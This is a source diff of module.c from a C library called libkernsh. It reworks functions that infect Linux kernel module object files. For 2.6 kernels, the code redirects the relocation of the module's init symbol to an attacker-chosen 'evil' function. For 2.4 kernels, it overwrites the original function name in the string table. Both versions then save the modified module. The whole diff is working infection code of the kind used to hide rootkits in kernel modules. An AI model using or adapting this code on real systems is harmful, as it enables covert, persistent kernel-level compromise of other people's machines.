@@ -1,7 +1,7 @@
 /*
 ** module.c for libkernsh
 ** 
-** $Id: module.c,v 1.2 2007-09-23 17:53:35 pouik Exp $
+** $Id: module.c,v 1.3 2007-10-15 13:04:07 pouik Exp $
 **
 */
 #include "libkernsh.h"
@@ -247,7 +247,7 @@ int kernsh_infect_module(char *module,
   ret = fct(module, mod, original_fname, evil_fname);
 
   /* FIXME : Little trick because elfsh_save_obj segfault with a ET_REL */
-  /* kernsh_unload_file(mod); */
+  kernsh_unload_file(mod);
   /* END FIXME */
 
   PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
@@ -272,20 +272,22 @@ int get_symbol_idx(elfshobj_t *file, elfsh_Sym *table, int num, char *symbol)
   PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, idx);
 }
 
+
 int kernsh_infect_module_linux_2_6(char *module, elfshobj_t *mod,
 				   char *original_fname, char *evil_fname)
 {
-  int i, ret, num, index, strindex, nbr, sh_offset, sh_size, idx_init, idx_ninit;
-  elfshsect_t   *sct, *gnu;
+  int ret, num, index, strindex, nbr, idx_init, idx_ninit, end, size;
+  elfshsect_t *sct, *gnu;
   elfsh_Sym *table;
-  elfsh_Rel rel;
-  FILE *newfd;
+  elfsh_Rel *rel, *cur;
+  u_int idx;
+  void *data;
   char buff[BUFSIZ];
 
   PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);
 
   ret = -1;
-  num = 0;
+  num = end = 0;
   idx_init = idx_ninit = -1;
   
   memset(buff, '\0', sizeof(buff));
@@ -321,12 +323,19 @@ int kernsh_infect_module_linux_2_6(char *module, elfshobj_t *mod,
   printf("idx_ninit %d\n", idx_ninit);
 #endif
 
+  if (idx_init == -1 || idx_ninit == -1)
+    {
+      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
+		   "Symbol doesn't exist", -1);
+    }
+
+  rel = elfsh_get_relent_by_name(mod, original_fname);
+
   gnu = elfsh_get_section_by_name(mod, 
 				  LIBKERNSH_STRING_REL_GNU, 
 				  &index, 
 				  &strindex, 
 				  &nbr);
-
   if (gnu == NULL)
     {
       snprintf(buff,
@@ -337,46 +346,32 @@ int kernsh_infect_module_linux_2_6(char *module, elfshobj_t *mod,
       PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
 		   buff, -1);
     }
-  
-  
-  /* FIXME : Little trick because elfsh_save_obj segfault with a ET_REL */
-  kernsh_unload_file(mod);
 
-  sh_offset = gnu->shdr->sh_offset;
-  sh_size = gnu->shdr->sh_size/sizeof(elfsh_Rel);
+  if (gnu->data == NULL)
+    gnu->data = elfsh_load_section(mod, gnu->shdr);
 
-  newfd = fopen(module, "r+");
-  if (newfd == NULL)
+  size = gnu->shdr->sh_size / sizeof(elfsh_Rel);
+
+  for (idx = 0; idx < size && !end; idx++)
     {
-      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
-		   "Unable to open file", -1);
-    }
-
-  for (i = 0; i < sh_size; i++)
-    {
-      fseek(newfd, sh_offset + i*sizeof(elfsh_Rel), SEEK_SET);
-      fread(&rel, sizeof(elfsh_Rel), 1, newfd);
-
-#if __DEBUG_KERNSH__
-      printf("REL %d\n", elfsh_get_relsym(&rel));
-#endif
-
-      if (elfsh_get_relsym(&rel) == idx_init)
+      data = elfsh_get_raw(gnu);
+      cur = (void *) ((elfsh_Rel  *) data + idx);
+      if (elfsh_get_relsym(cur) == idx_init)
 	{
-#if __DEBUG_KERNSH__
-	  printf("FIND SYMBOL in reloc %d, change it !\n", elfsh_get_relsym(&rel));
-#endif
-	  elfsh_set_relsym(&rel, idx_ninit);
-	  fseek(newfd, sh_offset + i*sizeof(elfsh_Rel), SEEK_SET);
-	  fwrite(&rel, sizeof(elfsh_Rel), 1, newfd);
-	  ret = 0;
+	  elfsh_set_relsym(cur, idx_ninit);
+	  end = 1;
 	}
     }
 
-  fclose(newfd);
-  /* END FIXME */
+  if (end == 0)
+    {
+      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
+		   "Symbol is not in reloc section", -1);
+    }
 
-  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
+  elfsh_save_obj(mod, mod->name);
+
+  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, 0);
 }
 
 int kernsh_infect_module_linux_2_4(char *module, elfshobj_t *mod,
@@ -384,10 +379,9 @@ int kernsh_infect_module_linux_2_4(char *module, elfshobj_t *mod,
 {
   elfshsect_t *strtab;
   elfsh_Sym *so;
-  FILE *newfd;
-  int           strindex;
-  int           index;
-  int           nbr;
+  int strindex;
+  int index;
+  int nbr;
 
   PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);
 
@@ -414,22 +408,9 @@ int kernsh_infect_module_linux_2_4(char *module, elfshobj_t *mod,
       PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
 		   "Unable to find original function name", -1);
     }
-  
-  /* FIXME : Little trick because elfsh_save_obj segfault with a ET_REL */
-  kernsh_unload_file(mod);
 
-  newfd = fopen(module, "r+");
-  
-  if (newfd == NULL)
-    {
-     PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
-		  "Unable to open file", -1);
-    }
-  fseek(newfd, strtab->shdr->sh_offset + so->st_name, SEEK_SET);
-  fwrite(evil_fname, strlen(evil_fname), 1, newfd);
-
-  fclose(newfd);
-  /* END FIXME */
+  elfsh_raw_write(mod, strtab->shdr->sh_offset + so->st_name, evil_fname, strlen(evil_fname));
+  elfsh_save_obj(mod, mod->name);
 
   PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, 0);
 }
